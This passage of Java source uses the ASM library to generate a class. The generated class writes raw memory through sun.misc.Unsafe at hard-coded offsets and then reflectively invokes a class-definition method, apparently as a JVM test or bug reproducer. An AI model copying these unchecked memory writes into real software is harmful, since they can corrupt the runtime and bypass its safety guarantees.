            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(16L));
            mv.visitInsn(97);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "putLong", "(JJ)V", false);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(16L));
            mv.visitInsn(97);
            mv.visitLdcInsn(new Long(360L));
            mv.visitInsn(97);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(16L));
            mv.visitInsn(97);
            mv.visitLdcInsn(new Long(360L));
            mv.visitInsn(97);
            mv.visitLdcInsn(new Long(8L));
            mv.visitInsn(97);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "putLong", "(JJ)V", false);
            mv.visitInsn(3);
            mv.visitVarInsn(54, 19);
            Label l26 = new Label();
            mv.visitLabel(l26);
            mv.visitFrame(0, 17, new Object[] {className, "[B", "sun/misc/Unsafe", new Integer(4), new Integer(4), "java/util/Map", className, new Integer(4), new Integer(1), "java/lang/String", "java/lang/Class", "java/lang/reflect/Constructor", "java/lang/Object", "java/lang/reflect/Method", "java/lang/instrument/ClassDefinition", "[Ljava/lang/instrument/ClassDefinition;", new Integer(1)}, 0, new Object[] {});
            mv.visitVarInsn(21, 19);
            mv.visitVarInsn(25, 1);
            mv.visitInsn(190);
            Label l27 = new Label();
            mv.visitJumpInsn(162, l27);
            mv.visitVarInsn(25, 2);
            mv.visitVarInsn(22, 5);
            mv.visitLdcInsn(new Long(16L));
            mv.visitInsn(97);
            mv.visitLdcInsn(new Long(360L));
            mv.visitInsn(97);
            mv.visitLdcInsn(new Long(8L));
            mv.visitInsn(97);
            mv.visitVarInsn(21, 19);
            mv.visitInsn(133);
            mv.visitInsn(97);
            mv.visitVarInsn(25, 1);
            mv.visitVarInsn(21, 19);
            mv.visitInsn(51);
            mv.visitMethodInsn(182, "sun/misc/Unsafe", "putByte", "(JB)V", false);
            mv.visitIincInsn(19, 1);
            mv.visitJumpInsn(167, l26);
            mv.visitLabel(l27);
            mv.visitFrame(2,1, null, 0, null);
            mv.visitVarInsn(25, 16);
            mv.visitVarInsn(25, 15);
            mv.visitInsn(4);
            mv.visitTypeInsn(189, "java/lang/Object");
            mv.visitInsn(89);
            mv.visitInsn(3);
            mv.visitVarInsn(25, 18);
            mv.visitInsn(83);
            mv.visitMethodInsn(182, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitInsn(87);
            mv.visitLabel(l4);
            Label l28 = new Label();
            mv.visitJumpInsn(167, l28);
            mv.visitLabel(l5);
            mv.visitFrame(4, 0, null, 1, new Object[] {"java/lang/Exception"});
            mv.visitVarInsn(58, 19);
            mv.visitVarInsn(25, 19);
            mv.visitMethodInsn(182, "java/lang/Exception", "printStackTrace", "()V", false);
            mv.visitLabel(l28);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitInsn(177);
            mv.visitMaxs(7, 20);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(2, "a", "(I)I", null, null);
            mv.visitCode();
            mv.visitVarInsn(21, 1);
            mv.visitInsn(4);
            Label l0 = new Label();
            mv.visitJumpInsn(164, l0);
            mv.visitLabel(l0);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitVarInsn(21, 1);
            mv.visitInsn(4);
            mv.visitInsn(104);
            mv.visitInsn(172);
            mv.visitMaxs(2, 2);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(2, "b", "(I)V", null, null);
            mv.visitCode();
            mv.visitVarInsn(25, 0);
            mv.visitVarInsn(21, 1);
            mv.visitMethodInsn(183, className, "a", "(I)I", false);
            mv.visitInsn(4);
            Label l0 = new Label();
            mv.visitJumpInsn(164, l0);
            mv.visitVarInsn(25, 0);
            mv.visitVarInsn(21, 1);
            mv.visitMethodInsn(183, className, "a", "(I)I", false);
            mv.visitInsn(87);
            Label l1 = new Label();
            mv.visitJumpInsn(167, l1);
            mv.visitLabel(l0);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitVarInsn(25, 0);
            mv.visitVarInsn(21, 1);
            mv.visitInsn(7);
            mv.visitInsn(96);
            mv.visitMethodInsn(183, className, "a", "(I)I", false);
            mv.visitInsn(87);
            mv.visitLabel(l1);
            mv.visitFrame(3, 0, null, 0, null);
            mv.visitInsn(177);
            mv.visitMaxs(3, 2);
            mv.visitEnd();
        }
        {
            mv = cw.visitMethod(1 + 8, "main", "([Ljava/lang/String;)V", null, new String[] { "java/lang/Throwable" });
            mv.visitCode();
            mv.visitTypeInsn(187, className);
            mv.visitInsn(89);
            mv.visitMethodInsn(183, className, "<init>", "()V", false);
            mv.visitVarInsn(58, 1);
            mv.visitVarInsn(25, 1);
            mv.visitMethodInsn(182, className, "test", "()V", false);
            mv.visitInsn(177);
            mv.visitMaxs(2, 2);
            mv.visitEnd();
        }
        cw.visitEnd();

        return cw.toByteArray();
    }

}